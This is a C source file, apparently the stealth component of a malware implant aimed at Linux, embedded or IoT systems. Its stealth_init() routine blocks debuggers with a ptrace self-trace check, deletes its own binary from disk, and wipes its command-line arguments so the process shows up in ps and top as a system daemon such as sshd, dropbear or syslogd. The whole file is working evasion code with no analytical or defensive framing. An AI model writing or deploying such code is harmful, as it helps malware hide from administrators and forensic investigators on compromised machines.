#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <signal.h>
#include <fcntl.h>
#include <time.h>

#ifdef __linux__
#include <sys/ptrace.h>
#include <sys/prctl.h>
#elif defined(__APPLE__)
#include <sys/ptrace.h>
#endif

#include "stealth.h"

// Legit process names to masquerade as
static const char *fake_names[] = {
    "httpd",
    "/usr/sbin/sshd",
    "/bin/busybox",
    "dropbear",
    "telnetd",
    "syslogd"
};

static void anti_debug(void) {
    #ifdef __linux__
    // Prevent debugger attachment
    if (ptrace(PTRACE_TRACEME, 0, 1, 0) == -1) {
        exit(0);
    }
    #elif defined(__APPLE__)
    if (ptrace(PT_TRACE_ME, 0, 0, 0) == -1) {
        exit(0);
    }
    #endif
}

static void self_delete(char *path) {
    if (path) {
        // Unlink binary from filesystem
        unlink(path);
        
        // Also try to remove from /tmp if we are there?
        // unlink("/tmp/..."); // Not knowing exact path is tricky unless we resolve generic ones
    }
}

// Robust Process Masquerading
// Clears argv memory and sets new name
static void disguise_process(int argc, char *argv[]) {
    // 1. Pick a random fake name
    srand(time(NULL));
    const char *name = fake_names[rand() % (sizeof(fake_names) / sizeof(char *))];
    
    // 2. Change process name (shown in 'top')
    #ifdef PR_SET_NAME
    prctl(PR_SET_NAME, name); // Only sets first 16 chars
    #endif

    // 3. Rewrite argv (shown in 'ps')
    // We want to overwrite argv[0], then NULL out the rest so they disappear or look clean.
    // Ideally we'd move the stack pointer but simpler is just memset.
    
    // Wipe all args first
    for (int i = 0; i < argc; i++) {
        memset(argv[i], 0, strlen(argv[i]));
    }
    
    // Copy new name into argv[0]
    // Note: If new name is longer than old argv[0], it might check boundaries or overwrite environ.
    // Safe practice: Only copy up to strlen(original_argv0).
    // But attackers often overwrite environ to get more space.
    strncpy(argv[0], name, strlen(argv[0]));
}

void stealth_init(int argc, char *argv[]) {
    // 1. Anti-Debug
    anti_debug();

    // 2. Self Delete
    self_delete(argv[0]);

    // 3. Masquerade
    disguise_process(argc, argv);
}
